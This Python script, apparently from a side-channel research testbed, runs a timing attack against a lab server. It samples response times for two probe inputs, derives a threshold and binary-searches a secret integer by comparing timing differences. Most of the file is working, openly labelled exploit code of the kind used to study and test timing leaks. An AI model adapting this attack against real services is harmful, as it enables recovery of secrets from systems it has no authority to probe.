# MIT License
#
# Copyright (c) 2017 Apogee Research
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


import socket
import time
import os
import pickle
import sys
import json
import matplotlib

matplotlib.use('Agg')
import matplotlib.pyplot as plt
import numpy as np


def establish_data():
    data_host = 'masterNuc'
    data_port = 9090
    try:
        s_ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_.connect((data_host, data_port))
        return s_
    except:
        print("Error: Data Establish")
        sys.exit(-1)


def send_cmd(c_, message):
    to_send = message + "\r"
    c_.sendall(to_send.encode())


def receive_cmd(c_):
    msg_char = ""
    message = ""
    while msg_char != "\r":
        msg_char = c_.recv(1).decode()
        message += msg_char
    return message.strip()


def close_cmd(c_):
    c_.close()


def send_request(remote_host, remote_port, request):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((remote_host, remote_port))
        to_send = request + '\n'
        a = time.time()
        s.sendall(to_send.encode())
        response = s.recv(1024).decode().strip()
        b = time.time()
        s.close()
        return {"request": request, "response": response, "runtime": b - a}
    except:
        return "Sample Error"


def single_sample(s_data_, remote_host, remote_port, sample, request, display=True):
    # Inform data host to start
    send_data_command_1 = {"DATA_Command": "Start", "REMOTE_PORT": remote_port, "Sample": sample}
    send_cmd(s_data_, json.dumps(send_data_command_1))
    data_msg_in_1 = receive_cmd(s_data_)
    data_in_1 = json.loads(data_msg_in_1)
    assert (data_in_1["DATA_Status"] == "Started")
    if display:
        print("\tA", "Starting")
        print("\t\tSending Request Processing Response")
        sys.stdout.flush()

    # Send attacker request
    attacker_request = request
    attacker_response = send_request(remote_host, remote_port, attacker_request)

    # Inform data host to stop
    send_data_command_2 = {"DATA_Command": "Stop", "Sample": sample}
    send_cmd(s_data_, json.dumps(send_data_command_2))
    data_msg_in_2 = receive_cmd(s_data_)

    # Processed timing host response/data
    data_in_2 = json.loads(data_msg_in_2)
    assert (data_in_2["DATA_Status"] == "Stopped")

    # Check for sample error (attacker and or benign) on timer and client
    if "Sample Error" not in [attacker_response,
                              data_in_2["Sample_Status"]]:
        return {"Data": data_in_2["Data"]}
    else:
        return "Error"


def collect_data(remote_host, remote_port, samples, s_data_):
    data_list = {1: [], 2: []}

    # Start sampling
    for sample in range(1, samples + 1, 1):
        print("Sample:", sample, "of", samples)
        sys.stdout.flush()

        request_1 = "1233"
        request_2 = "1235"
        result_1 = single_sample(s_data_, remote_host, remote_port, sample, request_1)
        result_2 = single_sample(s_data_, remote_host, remote_port, sample, request_2)

        if "Error" in [result_1, result_2]:
            print("\t\tError Sample:", sample)
            sys.stdout.flush()
        else:
            data_list[1].append(result_1["Data"])
            data_list[2].append(result_2["Data"])

        print("\tB", "Stopping")
        print("\t\tProceeding to Next")
        sys.stdout.flush()

    print("Complete")
    sys.stdout.flush()
    return data_list


def launch_attack(remote_host, remote_port, attack_input, s_data_):
    my_min = 0
    my_max = 2 ** 31 - 1
    operations = 0

    def proceed(m_min, m_max, m_operations):
        if m_operations > 100:
            print("Exceeded Operational Budget")
            return False
        return (m_max - m_min) > 1

    # Start exploit
    while proceed(my_min, my_max, operations):
        print("Min:", my_min, "Max:", my_max)
        sample = 1
        sys.stdout.flush()

        mid = my_min + round((my_max - my_min) / 2)
        request_l = str(my_min)
        request_m = str(mid)
        request_r = str(my_max)
        result_l = single_sample(s_data_, remote_host, remote_port, sample, request_l, False)
        result_m = single_sample(s_data_, remote_host, remote_port, sample, request_m, False)
        result_r = single_sample(s_data_, remote_host, remote_port, sample, request_r, False)
        operations += 3

        if "Error" in [result_l, result_m, result_r]:
            print("\t\tProcess Error Re-running ...")
            sys.stdout.flush()
            continue

        time_l = result_l["Data"]
        time_m = result_m["Data"]
        time_r = result_r["Data"]
        delta_l = abs(time_m - time_l)
        delta_r = abs(time_r - time_m)
        print("\tNum Ops:", operations, "Threshold:", attack_input, "L:", delta_l, "R:", delta_r)
        if delta_l < attack_input and delta_r < attack_input:
            continue

        if delta_l > delta_r:
            my_max = mid
        else:
            my_min = mid

    print("Complete")
    sys.stdout.flush()
    return {"Num Ops": operations, "Range": [my_min, my_max]}


def setup_data():
    # Establish data
    s_data_ = establish_data()
    return s_data_


def terminate_data(s_data_):
    # Inform data server complete
    send_data_command_3 = {"DATA_Command": "Complete"}
    send_cmd(s_data_, json.dumps(send_data_command_3))
    data_msg_in_3 = receive_cmd(s_data_)
    data_in_3 = json.loads(data_msg_in_3)
    assert (data_in_3["DATA_Status"] == "Complete")
    close_cmd(s_data_)


def process_results(data_filename, figname, display=False):
    # Read Data
    os.chdir("Data Input")
    data_list = pickle.load(open(data_filename + ".p", "rb"))
    os.chdir("..")

    set_1 = data_list[1]
    set_2 = data_list[2]

    mean_1 = np.mean(set_1)
    mean_2 = np.mean(set_2)
    decision_threshold = (max(mean_1, mean_2) - min(mean_1, mean_2)) / 2

    plot_data(data_list, figname, display)
    return decision_threshold


def plot_data(data_list, figname, display):
    def get_bins(data, a, b, n):
        # Get plot data
        bins = np.arange(a, b + (b - a) / n, (b - a) / n)
        H = plt.hist(data, bins=bins)
        plt.close()
        x = H[1][:-1]
        y = H[0]

        return [x, y]

    a = 0
    b = 500
    n = 1
    max_y = 10
    fs = 12

    set_1 = data_list[1]
    set_2 = data_list[2]
    mean_1 = np.mean(set_1)
    mean_2 = np.mean(set_2)

    set_1_H = get_bins(set_1, a, b, n)
    set_2_H = get_bins(set_2, a, b, n)

    fig = plt.figure()
    plt.plot(set_1_H[0], set_1_H[1], color="b")
    plt.plot(set_2_H[0], set_2_H[1], color="r")
    plt.plot([mean_1, mean_1], [0, max_y], "--", color="black")
    plt.plot([mean_2, mean_2], [0, max_y], "--", color="black")
    plt.xlabel("Response Time (ms)", fontsize=fs)
    plt.ylabel("Number of Samples", fontsize=fs)
    plt.ylim([0, max_y])
    plt.xlim([a, b])
    plt.xticks(fontsize=fs)
    plt.yticks(fontsize=fs)
    plt.grid()

    os.chdir("Figures")
    fig.savefig(figname + ".png", bbox_inches='tight', format='png', dpi=1200)
    os.chdir("..")

    if display:
        plt.show()
    plt.close()


def save_results(filename, results_data):
    os.chdir("Data Input")
    with open(filename + ".p", "wb") as out_file:
        pickle.dump(results_data, out_file)
    os.chdir("..")


def main():
    remote_host = 'serverNuc'
    remote_port = 8000
    data_filename = "Category 11 V_B"
    figname = "Category 11 V_B"

    print("Starting Sampling Host:", remote_host, ":", remote_port)
    sys.stdout.flush()
    samples = 10
    s_data_ = setup_data()
    results = collect_data(remote_host, remote_port, samples, s_data_)
    save_results(data_filename, results)
    process_output = process_results(data_filename, figname)
    print("Decision Threshold:", process_output)
    attack_output = launch_attack(remote_host, remote_port, process_output, s_data_)
    print("Result:", attack_output)
    terminate_data(s_data_)


if __name__ == "__main__":
    main()
